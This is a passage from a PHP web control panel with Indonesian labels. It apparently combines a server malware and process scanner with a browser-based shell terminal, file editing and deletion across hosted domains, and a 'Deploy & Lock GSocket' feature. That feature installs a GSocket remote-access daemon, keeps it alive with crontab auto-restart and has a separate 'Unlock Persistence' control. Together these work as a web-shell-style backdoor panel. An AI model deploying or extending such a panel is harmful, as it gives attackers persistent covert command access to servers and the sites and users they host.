                                            <div style="color:var(--t3);font-size:10px;margin-bottom:4px">Port</div>
                                            <select id="gs-lock-port" style="background:var(--bg2);color:var(--t1);border:1px solid var(--border);border-radius:var(--r);padding:6px 10px;font-size:12px">
                                                <option value="443">443</option>
                                                <option value="53">53</option>
                                                <option value="22">22</option>
                                                <option value="7350">7350</option>
                                            </select>
                                        </div>
                                    </div>
                                    <div style="margin-bottom:12px">
                                        <div style="color:var(--t3);font-size:10px;margin-bottom:6px">Interval Crontab (auto-restart jika mati)</div>
                                        <div style="display:flex;gap:6px;flex-wrap:wrap">
                                            <button class="btn btn-s btn-g lk-itv" data-v="1" onclick="selInterval(this)">1 menit</button>
                                            <button class="btn btn-s btn-g lk-itv active" data-v="5" onclick="selInterval(this)">5 menit</button>
                                            <button class="btn btn-s btn-g lk-itv" data-v="10" onclick="selInterval(this)">10 menit</button>
                                            <button class="btn btn-s btn-g lk-itv" data-v="15" onclick="selInterval(this)">15 menit</button>
                                            <button class="btn btn-s btn-g lk-itv" data-v="30" onclick="selInterval(this)">30 menit</button>
                                        </div>
                                    </div>
                                    <button class="btn btn-ok" id="btn-deploy-lock" onclick="gsDeployLock()"
                                        style="width:100%;justify-content:center;padding:14px;font-size:14px;font-weight:600">
                                        &#9889;&#128274; DEPLOY &amp; LOCK GSOCKET
                                    </button>
                                    <div id="lock-result" style="margin-top:8px;font-size:11px;font-family:monospace;color:var(--t2);white-space:pre-line;display:none"></div>
                                </div>
                            </div>

                            <!-- KONTROL MANUAL -->
                            <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap;align-items:center">
                                <span style="font-size:11px;color:var(--t3)">Manual:</span>
                                <button class="btn btn-ok btn-s"
                                    onclick="api('gsocket_start',{},function(d){log(d.ok?'✔ Daemon started':'✘ '+(d.error||'failed'));sGs()},null,60000)">&#9654; Start</button>
                                <button class="btn btn-w btn-s"
                                    onclick="api('gsocket_stop',{},function(){log('Semua proses dimatikan');sGs()})">&#9632; Stop</button>
                                <button class="btn btn-s btn-g" onclick="gsUnlock()">&#128275; Unlock Persistence</button>
                                <button class="btn btn-d btn-s"
                                    onclick="if(confirm('Uninstall GSocket + hapus semua persistence?'))api('gsocket_uninstall',{},function(){log('GSocket uninstalled');sGs()})">&#128465; Uninstall</button>
                            </div>
                            <div class="pn" style="margin-top:12px">
                                <div class="pn-h">
                                    <h3>&#128220; Deploy Log</h3><button class="btn btn-s btn-g"
                                        onclick="document.getElementById('alog').textContent='';log('Log cleared')"
                                        style="font-size:10px">Clear</button>
                                </div>
                                <div class="pn-b" style="padding:0">
                                    <div id="gs-log-mirror"
                                        style="font-family:monospace;font-size:11px;color:var(--t2);max-height:300px;overflow-y:auto;padding:12px;background:var(--bg0);border-radius:0 0 var(--r) var(--r)">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- TERMINAL -->
                <div id="p-terminal" class="pg hid">
                    <div class="trm" style="height:calc(100vh - 140px)">
                        <div class="trm-h">
                            <div class="dot dr" style="width:8px;height:8px"></div>
                            <div class="dot dy" style="width:8px;height:8px"></div>
                            <div class="dot dg" style="width:8px;height:8px"></div><span
                                style="flex:1;text-align:center;color:var(--t3);font-size:11px">Terminal &mdash;
                                <?= htmlspecialchars($user) ?>@
                                <?= htmlspecialchars(gethostname()) ?>
                            </span>
                        </div>
                        <div class="trm-b" id="to" style="min-height:400px;max-height:calc(100vh - 220px)">
                            <?= htmlspecialchars($user) ?>@
                            <?= htmlspecialchars(gethostname()) ?>:~$
                        </div>
                        <div class="trm-i"><span>$</span><input type=text id="tc" placeholder="Enter command..."
                                autofocus></div>
                    </div>
                </div>

                <!-- SERVER INFO -->
                <div id="p-info" class="pg hid">
                    <div class="pn">
                        <div class="pn-h">
                            <h3>&#9432; Server Info</h3><button class="btn btn-s" onclick="sInfo()">&#128260;
                                Refresh</button>
                        </div>
                        <div class="pn-b" id="ib">
                            <div class="ld">Click Refresh</div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <!-- FILE VIEWER MODAL -->
    <div id="fv-overlay"
        style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:9999;align-items:center;justify-content:center">
        <div
            style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r);width:85vw;max-width:900px;max-height:85vh;display:flex;flex-direction:column;overflow:hidden">
            <div
                style="padding:12px 16px;border-bottom:1px solid var(--border);background:var(--bg3);display:flex;align-items:center;gap:10px">
                <span style="font-size:14px">&#128269;</span>
                <span style="font-weight:600;font-size:13px">File Preview</span>
                <span id="fv-title"
                    style="color:var(--t3);font-size:11px;font-family:monospace;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"></span>
                <span id="fv-meta"
                    style="color:var(--orange);font-size:11px;font-family:monospace;white-space:nowrap"></span>
                <button onclick="closeViewer()"
                    style="background:none;border:none;color:var(--t2);font-size:18px;cursor:pointer;padding:0 4px;line-height:1">&#215;</button>
            </div>
            <div style="padding:8px 16px;background:var(--bg0);border-bottom:1px solid var(--border)">
                <span style="color:var(--t3);font-size:10px;text-transform:uppercase;letter-spacing:1px">Full Path:
                </span>
                <code id="fv-path" style="color:var(--green);font-size:11px;word-break:break-all"></code>
            </div>
            <pre id="fv-body"
                style="flex:1;overflow:auto;padding:16px;margin:0;font-family:'SF Mono','Fira Code',monospace;font-size:12px;line-height:1.65;color:var(--t1);background:var(--bg0);white-space:pre-wrap;word-break:break-all"></pre>
            <div
                style="padding:10px 16px;border-top:1px solid var(--border);display:flex;justify-content:flex-end;gap:8px">
                <button id="fv-edit" class="btn btn-s" style="background:var(--orange);color:#000">&#9999;&#65039; Edit</button>
                <button id="fv-rename" class="btn btn-s btn-w">&#128221; Rename</button>
                <button id="fv-del" class="btn btn-s btn-d">&#128465; Delete</button>
                <button onclick="closeViewer()" class="btn btn-s btn-g">Close</button>
            </div>
        </div>
    </div>

    <!-- FILE EDITOR MODAL -->
    <div id="fe-overlay"
        style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.82);z-index:10000;align-items:center;justify-content:center">
        <div
            style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r);width:90vw;max-width:1000px;height:88vh;display:flex;flex-direction:column;overflow:hidden">
            <div
                style="padding:12px 16px;border-bottom:1px solid var(--border);background:var(--bg3);display:flex;align-items:center;gap:10px;flex-shrink:0">
                <span style="font-size:14px">&#9999;&#65039;</span>
                <span style="font-weight:600;font-size:13px;color:var(--orange)">File Editor</span>
                <span id="fe-title"
                    style="color:var(--t2);font-size:11px;font-family:monospace;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"></span>
                <span id="fe-meta" style="color:var(--t3);font-size:10px;white-space:nowrap"></span>
                <button onclick="closeEditor()"
                    style="background:none;border:none;color:var(--t2);font-size:18px;cursor:pointer;padding:0 4px;line-height:1">&#215;</button>
            </div>
            <div
                style="padding:6px 16px;background:var(--bg0);border-bottom:1px solid var(--border);flex-shrink:0;display:flex;align-items:center;gap:8px">
                <span style="color:var(--t3);font-size:10px;text-transform:uppercase;letter-spacing:1px">Path:</span>
                <code id="fe-path"
                    style="color:var(--green);font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"></code>
                <span
                    style="background:#ff9f0a1a;border:1px solid #ff9f0a44;border-radius:4px;padding:2px 8px;font-size:10px;color:var(--orange)">&#9888;
                    Edit carefully</span>
            </div>
            <textarea id="fe-body" spellcheck="false"
                style="flex:1;width:100%;background:#0a0a0f;border:none;color:#e8e8e8;font-family:'SF Mono','Fira Code','Consolas',monospace;font-size:12px;line-height:1.7;padding:14px 16px;resize:none;outline:none;tab-size:4"></textarea>
            <div
                style="padding:10px 16px;border-top:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;flex-shrink:0;background:var(--bg2)">
                <div id="fe-status" style="font-size:11px;color:var(--t3)">Ready to edit</div>
                <div style="display:flex;gap:8px">
                    <button id="fe-save" class="btn btn-ok" onclick="saveFile()">&#128190; Save File</button>
                    <button onclick="closeEditor()" class="btn btn-s btn-g">Cancel</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        var E = document.createElement.bind(document);
        function esc(s) { var d = E('span'); d.textContent = s; return d.innerHTML; }
        function api(a, d, cb, errCb, timeout) { d = d || {}; d.api = a; var ms = timeout || 30000; var fd = new FormData(); for (var k in d) fd.append(k, d[k]); var ac = new AbortController(); var t = setTimeout(function () { ac.abort(); }, ms); fetch(location.href, { method: 'POST', body: fd, signal: ac.signal }).then(function (r) { clearTimeout(t); if (!r.ok) throw new Error('HTTP ' + r.status); return r.json() }).then(function (j) { if (cb) cb(j) }).catch(function (e) { clearTimeout(t); if (e.name === 'AbortError') e = new Error('Request timeout (' + Math.round(ms/1000) + 's)'); log('ERR: ' + e.message); if (errCb) errCb(e); }); }
        function nav(n) { document.querySelectorAll('.pg').forEach(function (p) { p.classList.add('hid') }); var el = document.getElementById('p-' + n); el.classList.remove('hid'); el.classList.add('fi'); document.querySelectorAll('.ni').forEach(function (b) { b.classList.remove('active') }); document.querySelector('.ni[data-p="' + n + '"]').classList.add('active'); if (n === 'scanner' && Object.keys(_scanRoots).length === 0) loadScanRoots(); }
        document.querySelectorAll('.ni').forEach(function (b) { b.addEventListener('click', function () { nav(this.dataset.p) }) });
        loadScanRoots();
        function log(m) { var ts = '[' + new Date().toLocaleTimeString() + '] '; var l = document.getElementById('alog'), d = E('div'); d.textContent = ts + m; l.insertBefore(d, l.firstChild); var gm = document.getElementById('gs-log-mirror'); if (gm) { var d2 = E('div'); d2.textContent = ts + m; d2.style.color = m.indexOf('✔') >= 0 ? 'var(--green)' : m.indexOf('✘') >= 0 ? 'var(--accent)' : m.indexOf('▸') >= 0 ? 'var(--orange)' : 'var(--t2)'; gm.insertBefore(d2, gm.firstChild); } }
        function sProcs() {
            document.getElementById('pt').textContent = ''; var tr = E('tr'), td = E('td'); td.colSpan = 6; td.className = 'ld pu'; td.textContent = 'Scanning...'; tr.appendChild(td); document.getElementById('pt').appendChild(tr);
            api('scan_processes', {}, function (d) {
                var tb = document.getElementById('pt'); tb.textContent = '';
                d.procs.forEach(function (p) {
                    var tr = E('tr'); if (p.threat) tr.className = 'th';
                    var cells = [p.pid, p.cpu + '%', p.mem + '%', p.cmd.substring(0, 80), '', ''];
                    cells.forEach(function (c, i) {
                        var td = E('td');
                        if (i === 3) { td.style.maxWidth = '400px'; td.style.overflow = 'hidden'; td.style.textOverflow = 'ellipsis'; td.style.whiteSpace = 'nowrap'; td.title = p.cmd; }
                        if (i === 4) { var s = E('span'); s.className = 'tag ' + (p.threat ? 'tag-d' : 'tag-ok'); s.textContent = p.threat ? p.type : 'clean'; td.appendChild(s); }
                        else if (i === 5 && p.threat) { var b = E('button'); b.className = 'btn btn-s btn-d'; b.textContent = 'Kill'; b.onclick = function () { if (confirm('Kill PID ' + p.pid + '?')) api('kill_pid', { pid: p.pid }, function () { log('Killed ' + p.pid); sProcs() }) }; td.appendChild(b); }
                        else { td.textContent = c; }
                        tr.appendChild(td);
                    });
                    tb.appendChild(tr);
                });
                document.getElementById('dv-p').textContent = d.total;
                document.getElementById('dv-t').textContent = d.threat_count;
                var pb = document.getElementById('pb'); if (d.threat_count > 0) { pb.textContent = d.threat_count; pb.classList.remove('hid') } else { pb.classList.add('hid') }
                log('Processes: ' + d.total + ', threats: ' + d.threat_count);
            });
        }
        var _scanTimer = null;
        var _scanRoots = {};
        function loadScanRoots() {
            api('get_roots', {}, function (d) {
                var sel = document.getElementById('scan-domain-sel');
                var hint = document.getElementById('scan-hint');
                var btn = document.getElementById('scan-btn');
                if (!sel) return;
                if (!d.roots || Object.keys(d.roots).length === 0) {
                    sel.options[0].textContent = '— All Domains —';
                    if (hint) hint.textContent = '⚠️ Domain list tidak bisa di-load. Scan akan menyasar semua direktori.';
                    if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
                    return;
                }
                _scanRoots = d.roots;
                var count = Object.keys(d.roots).length;
                var prev = sel.value;
                while (sel.options.length > 1) sel.remove(1);
                sel.options[0].textContent = '— All Domains (' + count + ') —' + (count > 5 ? '  ⚠️ lambat' : '');
                Object.keys(d.roots).forEach(function (k) {
                    var opt = E('option'); opt.value = k;
                    opt.textContent = '⚡ ' + k;
                    sel.appendChild(opt);
                });
                if (prev && d.roots[prev]) sel.value = prev;
                if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
                if (hint) {
                    hint.innerHTML = count > 1
                        ? '&#9889; <strong>' + count + ' domain ditemukan.</strong> Pilih 1 domain dari dropdown untuk scan cepat (~5-30s), atau biarkan "All Domains" untuk scan semua (bisa >2 menit).'
                        : '&#9989; <strong>1 domain.</strong> Klik Scan untuk mulai.';
                }
            });
        }
        var _scanSigCounts = {};
        function _updateSigFilter() {
            var sel = document.getElementById('scan-sig-filter');
            var bar = document.getElementById('scan-filter-bar');
            if (!sel) return;
            var prev = sel.value;
            while (sel.options.length > 1) sel.remove(1);
            var sorted = Object.keys(_scanSigCounts).sort(function (a, b) { return _scanSigCounts[b] - _scanSigCounts[a]; });
            sorted.forEach(function (sig) {
                var opt = E('option'); opt.value = sig;
                opt.textContent = sig.toUpperCase() + ' (' + _scanSigCounts[sig] + ')';
                sel.appendChild(opt);
            });
            if (prev && _scanSigCounts[prev]) sel.value = prev;
            if (sorted.length > 0) bar.style.display = 'flex';
        }
        function filterScanResults() {
            var sel = document.getElementById('scan-sig-filter');
            var filter = sel ? sel.value : '';
            var rows = document.querySelectorAll('#st tr[data-sigs]');
            var shown = 0, total = rows.length;
            rows.forEach(function (tr) {
                var sigs = tr.getAttribute('data-sigs') || '';
                if (!filter || sigs.indexOf(filter) !== -1) { tr.style.display = ''; shown++; }
                else { tr.style.display = 'none'; }
            });
            var cnt = document.getElementById('scan-filter-count');
            if (cnt) cnt.textContent = filter ? (shown + '/' + total + ' threats') : '';
        }
        function toggleWhitelist() {
            var p = document.getElementById('wl-panel');
            if (!p) return;
            if (p.style.display === 'none') { p.style.display = 'block'; loadWhitelist(); }
            else { p.style.display = 'none'; }
        }
        function loadWhitelist() {
            api('whitelist_list', {}, function(d) {
                var list = document.getElementById('wl-list');
                var cnt = document.getElementById('wl-count');
                if (!list) return;
                var wl = d.whitelist || [];
                if (cnt) cnt.textContent = '(' + wl.length + ' entries)';
                if (wl.length === 0) { list.innerHTML = '<div style="color:var(--t3);font-size:11px;padding:6px">No whitelist entries yet. Use the WL button on scan results to add.</div>'; return; }
                list.innerHTML = '';
                wl.forEach(function(w) {
                    var row = E('div'); row.style.cssText = 'display:flex;align-items:center;gap:8px;padding:4px 8px;border-bottom:1px solid var(--border);font-size:11px';
                    var lbl = E('span'); lbl.style.cssText = 'flex:1;color:var(--t2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap';
                    var typeBadge = E('span'); typeBadge.style.cssText = 'font-size:9px;padding:2px 6px;border-radius:4px;font-weight:600;margin-right:6px';
                    if (w.type === 'sig') { typeBadge.textContent = 'SIG'; typeBadge.style.background = '#4a3000'; typeBadge.style.color = '#ffa500'; lbl.textContent = w.sig; }
                    else if (w.type === 'dir') { typeBadge.textContent = 'DIR'; typeBadge.style.background = '#003a4a'; typeBadge.style.color = '#00bcd4'; lbl.textContent = w.dir + (w.sig ? ' [' + w.sig + ']' : ''); }
                    else {
                        typeBadge.textContent = 'FILE'; typeBadge.style.background = '#1a3a1a'; typeBadge.style.color = '#4caf50';
                        var szInfo = w.size ? ' 📌' + (w.size > 1024 ? Math.round(w.size/1024) + 'KB' : w.size + 'B') : '';
                        lbl.textContent = w.path + (w.sig ? ' [' + w.sig + ']' : '') + szInfo;
                    }
                    var dt = E('span'); dt.style.cssText = 'font-size:9px;color:var(--t3);min-width:80px'; dt.textContent = w.added || '';
                    var rm = E('button'); rm.className = 'btn btn-s btn-d'; rm.style.cssText = 'font-size:9px;padding:2px 6px'; rm.textContent = 'Remove';
                    rm.onclick = (function(key) { return function() { api('whitelist_remove', { key: key }, function(d2) { if (d2.ok) { log('Whitelist removed: ' + key); loadWhitelist(); } }); }; })(w.key);
                    row.appendChild(typeBadge); row.appendChild(lbl); row.appendChild(dt); row.appendChild(rm);
                    list.appendChild(row);
                });
            });
        }
        var _hiddenSigs = {};
        function hideSig(sig) {
            _hiddenSigs[sig] = true;
            _applyHiddenSigs();
            api('whitelist_add', { mode: 'sig', sig: sig }, function(d) {
                if (d.ok) log('Filtered: ' + sig + ' (saved)');
            });
        }
        function unhideSig(sig) {
            delete _hiddenSigs[sig];
            _applyHiddenSigs();
            api('whitelist_remove', { key: 'sig:' + sig }, function(d) {
                if (d.ok) log('Unfiltered: ' + sig);
            });
        }
        function _applyHiddenSigs() {
            var rows = document.querySelectorAll('#st tr[data-sigs]');
            var hidden = 0, total = rows.length;
            rows.forEach(function(tr) {
                var sigs = (tr.getAttribute('data-sigs') || '').split(',');
                var dominated = sigs.every(function(s) { return _hiddenSigs[s]; });
                if (dominated) { tr.style.display = 'none'; hidden++; }
                else { tr.style.display = ''; }
            });
            var fb = document.getElementById('hidden-sigs-bar');
            if (!fb) return;
            fb.innerHTML = '';
            var keys = Object.keys(_hiddenSigs);
            if (keys.length === 0) { fb.style.display = 'none'; return; }
            fb.style.display = 'flex';
            var lbl = E('span'); lbl.style.cssText = 'font-size:10px;color:#888;margin-right:6px'; lbl.textContent = 'Hidden (' + hidden + '):';
            fb.appendChild(lbl);
            keys.forEach(function(sig) {
                var chip = E('span'); chip.style.cssText = 'display:inline-flex;align-items:center;gap:3px;background:#333;color:#aaa;font-size:10px;padding:2px 8px;border-radius:10px;margin-right:4px;cursor:default';
                var name = E('span'); name.textContent = sig;
                var x = E('span'); x.textContent = '×'; x.style.cssText = 'cursor:pointer;color:#f66;font-weight:bold;font-size:12px;margin-left:2px';
                x.onclick = function() { unhideSig(sig); };
                chip.appendChild(name); chip.appendChild(x);
                fb.appendChild(chip);
            });
            var clearAll = E('span'); clearAll.style.cssText = 'font-size:10px;color:#f66;cursor:pointer;margin-left:8px'; clearAll.textContent = 'Clear all';
            clearAll.onclick = function() { _hiddenSigs = {}; _applyHiddenSigs(); api('whitelist_list', {}, function(d) { (d.whitelist||[]).forEach(function(w) { if (w.type==='sig') api('whitelist_remove',{key:w.key},function(){}); }); }); };
            fb.appendChild(clearAll);
        }
        var _sortDir = {};
        function sortScanResults(col) {
            var tb = document.getElementById('st');
            if (!tb) return;
            var rows = Array.from(tb.querySelectorAll('tr[data-sigs]'));
            if (rows.length === 0) return;
            _sortDir[col] = !_sortDir[col];
            var asc = _sortDir[col];
            rows.sort(function(a, b) {
                var va, vb;
                if (col === 'size') {
                    va = parseInt(a.getAttribute('data-size') || '0', 10);
                    vb = parseInt(b.getAttribute('data-size') || '0', 10);
                } else if (col === 'mod') {
                    va = a.getAttribute('data-mod') || '';
                    vb = b.getAttribute('data-mod') || '';
                }
                if (va < vb) return asc ? -1 : 1;
                if (va > vb) return asc ? 1 : -1;
                return 0;
            });
            rows.forEach(function(r) { tb.appendChild(r); });
            log('Sorted by ' + col + ' (' + (asc ? 'asc' : 'desc') + ')');
        }
        function renderThreatRow(t, tb) {
            var tr = E('tr'); tr.className = 'th';
            var topSig = (t.sigs && t.sigs[0]) ? t.sigs[0] : (t.sig || '').split(' ')[0].toLowerCase();
            var allSigs = t.sigs || [topSig];
            tr.setAttribute('data-sigs', allSigs.join(','));
            tr.setAttribute('data-path', t.path);
            tr.setAttribute('data-size', t.size);
            tr.setAttribute('data-mod', t.mod || '');
            allSigs.forEach(function (s) { _scanSigCounts[s] = (_scanSigCounts[s] || 0) + 1; });
            _updateSigFilter();
            var fname = t.path.split('/').pop();
            var cells = [t.domain, t.sig, fname, t.path, t.size, t.mod, ''];
            cells.forEach(function (c, i) {
                var td = E('td');
                if (i === 1) {
                    allSigs.forEach(function(sigName, si) {
                        var s = E('span'); s.className = 'tag tag-d'; s.style.cssText = 'cursor:pointer;margin-right:3px';
                        s.textContent = sigName; s.title = 'Click to hide all "' + sigName + '"';
                        s.onclick = (function(sn) { return function() { hideSig(sn); }; })(sigName);
                        td.appendChild(s);
                    });
                } else if (i === 3) {
                    td.style.maxWidth = '280px'; td.style.overflow = 'hidden';
                    var code = E('code'); code.style.cssText = 'font-size:10px;color:var(--t2);word-break:break-all;display:block';
                    code.textContent = c; code.title = c; td.appendChild(code);
                    var cp = E('button'); cp.className = 'btn btn-s btn-g'; cp.style.cssText = 'font-size:9px;padding:2px 6px;margin-top:3px';
                    cp.textContent = 'Copy Path'; cp.onclick = (function (path) { return function () { navigator.clipboard.writeText(path).then(function () { log('Path copied: ' + path) }) }; })(c);
                    td.appendChild(cp);
                } else if (i === 6) {
                    var fileUrl = buildUrl(t.domain, t.path);
                    if (fileUrl) {
                        var ub = E('a'); ub.className = 'btn btn-s btn-g'; ub.style.cssText = 'margin-right:4px;text-decoration:none';
                        ub.textContent = '🔗 Open URL'; ub.href = fileUrl; ub.target = '_blank'; ub.title = fileUrl;
                        td.appendChild(ub);
                    }
                    var vb = E('button'); vb.className = 'btn btn-s btn-w'; vb.style.marginRight = '4px'; vb.textContent = '👁 View';
                    vb.onclick = (function (path) { return function () { viewFile(path, null) }; })(t.path);
                    td.appendChild(vb);
                    var eb = E('button'); eb.className = 'btn btn-s'; eb.style.cssText = 'margin-right:4px;background:var(--orange);color:#000'; eb.textContent = '✏️ Edit';
                    eb.onclick = (function (path) { return function () { editFile(path, null) }; })(t.path);
                    td.appendChild(eb);
                    var db = E('button'); db.className = 'btn btn-s btn-d'; db.textContent = '🗑 Delete';
                    db.onclick = (function (path, row) { return function () { if (confirm('Delete?\n\n' + path)) api('remove_file', { path: path }, function (d) { if (d.method === 'overwrite') log('Killed (overwrite): ' + path); else log('Deleted: ' + path); row.style.opacity = '0.3'; row.style.pointerEvents = 'none'; }) }; })(t.path, tr);
                    td.appendChild(db);
                    // Hide file button (whitelist path + pin size)
                    var hfb = E('button'); hfb.className = 'btn btn-s'; hfb.style.cssText = 'margin-left:4px;background:#444;color:#aaa;font-size:10px;padding:3px 8px'; hfb.textContent = 'Hide';
                    hfb.title = 'Hide this file from results (pinned to current size)';
                    hfb.onclick = (function(path, fileSize, row) { return function() {
                        api('whitelist_add', { mode: 'path', path: path, size: fileSize }, function(d) {
                            if (d.ok) { row.style.display = 'none'; log('Hidden: ' + path.split('/').pop() + ' (pinned ' + fileSize + 'B)'); }
                        });
                    }; })(t.path, t.size, tr);
                    td.appendChild(hfb);
                } else {
                    td.textContent = c;
                }
                tr.appendChild(td);
            });
            tr.style.cssText = 'animation:fadeSlideIn 0.3s ease-out';
            tb.appendChild(tr);
            return tr;
        }
        function sFiles() {
            var startTime = Date.now();
            var selEl = document.getElementById('scan-domain-sel');
            var pathEl = document.getElementById('scan-custom-path');
            var hintEl = document.getElementById('scan-hint');
            var btnEl = document.getElementById('scan-btn');
            var selDomain = selEl ? selEl.value : '';
            var customPath = pathEl ? pathEl.value.trim() : '';
            var scanParams = {};
            if (customPath) { scanParams.scan_path = customPath; }
            else if (selDomain) { scanParams.scan_domain = selDomain; }
            if (btnEl) { btnEl.disabled = true; btnEl.style.opacity = '0.5'; }
            if (hintEl) {
                var target = customPath ? customPath : (selDomain ? selDomain : 'semua domain');
                hintEl.innerHTML = '&#128270; Scanning: <strong>' + target + '</strong>...';
            }
            var tb = document.getElementById('st');
            tb.textContent = '';
            _scanSigCounts = {};
            var sigSel = document.getElementById('scan-sig-filter');
            if (sigSel) { sigSel.value = ''; while (sigSel.options.length > 1) sigSel.remove(1); }
            var filterBar = document.getElementById('scan-filter-bar');
            if (filterBar) filterBar.style.display = 'none';
            var liveWrap = E('div'); liveWrap.id = 'scan-live-wrap';
            liveWrap.style.cssText = 'display:flex;align-items:center;gap:12px;padding:12px 16px;background:var(--bg3);border-bottom:1px solid var(--border)';
            var spin = E('div'); spin.id = 'scan-spin';
            spin.style.cssText = 'width:18px;height:18px;border:3px solid #ff453a33;border-top-color:var(--accent);border-radius:50%;animation:spin 0.7s linear infinite;flex-shrink:0';
            var spinLbl = E('span'); spinLbl.id = 'scan-live-status';
            spinLbl.style.cssText = 'color:var(--t1);font-weight:600;font-size:13px;flex:1';
            spinLbl.textContent = '🔍 Starting scan...';
            var timerEl = E('span'); timerEl.id = 'scan-timer';
            timerEl.style.cssText = 'font-family:monospace;color:var(--orange);font-size:12px;flex-shrink:0';
            timerEl.textContent = '0s';
            var counterEl = E('span'); counterEl.id = 'scan-file-counter';
            counterEl.style.cssText = 'font-family:monospace;color:var(--t3);font-size:11px;flex-shrink:0';
            counterEl.textContent = '0 files';
            var threatCounter = E('span'); threatCounter.id = 'scan-threat-counter';
            threatCounter.style.cssText = 'font-family:monospace;color:var(--accent);font-size:12px;font-weight:700;flex-shrink:0;display:none';
            threatCounter.textContent = '0 threats';
            liveWrap.appendChild(spin); liveWrap.appendChild(spinLbl);
            liveWrap.appendChild(counterEl); liveWrap.appendChild(threatCounter); liveWrap.appendChild(timerEl);
            var tableParent = tb.parentNode;
            tableParent.insertBefore(liveWrap, tableParent.querySelector('table') || tb.parentNode.firstChild);
            if (!document.getElementById('scan-style')) {
                var st = E('style'); st.id = 'scan-style';
                st.textContent = '@keyframes spin{to{transform:rotate(360deg)}} @keyframes fadeSlideIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}';
                document.head.appendChild(st);
            }
            if (_scanTimer) clearInterval(_scanTimer);
            var elapsed = 0;
            _scanTimer = setInterval(function () {
                elapsed++;
                var el = document.getElementById('scan-timer');
                if (el) el.textContent = elapsed + 's';
            }, 1000);
            var fd = new FormData();
            fd.append('api', 'scan_files_stream');
            for (var k in scanParams) fd.append(k, scanParams[k]);
            var threatTotal = 0;
            var totalFilesScanned = 0;
            var buffer = '';
            function processLine(line) {
                line = line.trim();
                if (!line) return;
                try {
                    var msg = JSON.parse(line);
                } catch (e) { return; }
                if (msg.type === 'start') {
                    var sl = document.getElementById('scan-live-status');
                    if (sl) sl.textContent = '🔍 Scanning ' + msg.domains + ' domain(s): ' + (msg.roots || []).join(', ');
                    log('Scan started: ' + msg.domains + ' domain(s)');
                }
                else if (msg.type === 'progress') {
                    var sl = document.getElementById('scan-live-status');
                    if (sl) sl.textContent = '🔍 Scanning: ' + msg.domain + '...';
                    var fc = document.getElementById('scan-file-counter');
                    if (fc) fc.textContent = msg.files.toLocaleString() + ' files';
                }
                else if (msg.type === 'threat') {
                    threatTotal = msg.count;
                    var tc = document.getElementById('scan-threat-counter');
                    if (tc) { tc.style.display = 'inline'; tc.textContent = threatTotal + ' threat' + (threatTotal > 1 ? 's' : '') + ' ⚠'; }
                    renderThreatRow(msg.threat, tb);
                    log('⚠ FOUND: ' + msg.threat.sig + ' → ' + msg.threat.path);
                    document.getElementById('dv-s').textContent = threatTotal;
                }
                else if (msg.type === 'domain_done') {
                    totalFilesScanned += msg.files;
                    var fc = document.getElementById('scan-file-counter');
                    if (fc) fc.textContent = totalFilesScanned.toLocaleString() + ' files';
                    log('  ▸ ' + msg.domain + ': ' + msg.files.toLocaleString() + ' files scanned');
                }
                else if (msg.type === 'done') {
                    _gotDone = true;
                    clearInterval(_scanTimer); _scanTimer = null;
                    var elapsed2 = Math.round((Date.now() - startTime) / 1000);
                    var lw = document.getElementById('scan-live-wrap');
                    if (lw) lw.parentNode.removeChild(lw);
                    if (btnEl) { btnEl.disabled = false; btnEl.style.opacity = '1'; }
                    var totalFiles = 0;
                    if (msg.files_scanned) for (var dk in msg.files_scanned) totalFiles += msg.files_scanned[dk];
                    if (hintEl) {
                        hintEl.innerHTML = '&#9989; Selesai dalam <strong>' + elapsed2 + 's</strong> &mdash; <strong>' + totalFiles.toLocaleString() + '</strong> file diperiksa &mdash; <strong style="color:' + (msg.total > 0 ? 'var(--accent)' : 'var(--green)') + '">' + msg.total + ' ancaman</strong>';
                    }
                    if (msg.total === 0) {
                        var tr = E('tr'), td = E('td'); td.colSpan = 7;
                        td.style.cssText = 'text-align:center;padding:28px';
                        var doneWrap = E('div'); doneWrap.style.cssText = 'display:flex;flex-direction:column;align-items:center;gap:8px';
                        var doneIcon = E('div'); doneIcon.style.cssText = 'font-size:32px'; doneIcon.textContent = '✔';
                        var doneTxt = E('div'); doneTxt.style.cssText = 'color:var(--green);font-weight:600;font-size:14px';
                        doneTxt.textContent = 'All Clean — No threats found across ' + msg.domains + ' domain(s)';
                        var doneSub = E('div'); doneSub.style.cssText = 'color:var(--t3);font-size:11px';
                        doneSub.textContent = totalFiles.toLocaleString() + ' files scanned in ' + elapsed2 + 's';
                        doneWrap.appendChild(doneIcon); doneWrap.appendChild(doneTxt); doneWrap.appendChild(doneSub);
                        td.appendChild(doneWrap); tr.appendChild(td); tb.appendChild(tr);
                    }
                    log('✔ Scan complete in ' + elapsed2 + 's — ' + msg.total + ' threat(s) in ' + msg.domains + ' domain(s) — ' + totalFiles.toLocaleString() + ' files');
                    document.getElementById('dv-s').textContent = msg.total;
                }
            }
            var _gotDone = false;
            fetch(location.href, { method: 'POST', body: fd }).then(function (response) {
                if (!response.ok) throw new Error('HTTP ' + response.status);
                if (!response.body) {
                    return response.text().then(function (text) {
                        text.split('\n').forEach(processLine);
                    });
                }
                var reader = response.body.getReader();
                var decoder = new TextDecoder();
                function readChunk() {
                    return reader.read().then(function (result) {
                        if (result.done) {
                            if (buffer) processLine(buffer);
                            if (!_gotDone) {
                                clearInterval(_scanTimer); _scanTimer = null;
                                var elapsed2 = Math.round((Date.now() - startTime) / 1000);
                                var lw = document.getElementById('scan-live-wrap');
                                if (lw) lw.parentNode.removeChild(lw);
                                if (btnEl) { btnEl.disabled = false; btnEl.style.opacity = '1'; }
